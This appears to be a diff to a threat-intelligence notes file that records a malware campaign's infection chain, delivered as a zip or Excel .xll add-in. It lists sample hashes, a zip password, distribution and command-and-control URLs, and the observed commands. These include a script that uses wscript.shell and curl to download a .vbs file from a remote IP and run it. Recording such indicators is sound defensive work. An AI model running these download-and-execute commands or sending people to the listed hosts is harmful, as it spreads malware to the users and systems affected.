@@ -6,6 +6,9 @@
 .zip 02e2f8dd9d940865098ca5baf4705d542572180177a67c33ad658133f63fb0f8 pw = 678
 .dll aebff5134e07a1586b911271a49702c8623b8ac8da2c135d4d3b0145a826f507
 
+.xll ca0fedc82a173af6ba4e5764bce4c98838d59babc99fdea3c9325f54ade2f649
+.dll 8ed71986b28af6facf58d6d47d1190459d95427d0b0d92f32b25de3cd0755f2c
+
 *************************************************
 
 zip > lnk > curl > dll
@@ -30,10 +33,26 @@ netstat.exe -aon
 
 *************************************************
 
+EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\8O.xll"
+
+c:\users\public\default.exe about:"<script>var b = new ActiveXObject("wscript.shell"); b.run('cmd /c C:\\Windows\\system32\\curl.exe -o c:\\users\\public\\123321.vbs http://45.76.233.103/FwUzQEk/02do&&timeout 10&&c:\\users\\public\\123321.vbs', 0); window.close();</script>"
+
+cmd.exe /c C:\Windows\system32\curl.exe -o c:\users\public\123321.vbs http://45.76.233.103/FwUzQEk/02do&&timeout 10&&c:\users\public\123321.vbs
+
+curl.exe  -o c:\users\public\123321.vbs http://45.76.233.103/FwUzQEk/02do
+
+timeout  10
+
+WScript.exe "C:\users\public\123321.vbs 
+
+http://45.76.233.103/FwUzQEk/02do
+
+*************************************************
+
 distro urls
 
 http://207.246.78.68/6kQh/T7t
-
+http://45.76.233.103/FwUzQEk/02do
 
 *************************************************
 
@@ -44,6 +63,4 @@ https://79.141.175.96:2078/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivert
 https://38.242.240.28:1194/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
 https://209.126.9.47:2078/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
 
-
-
-
+*************************************************
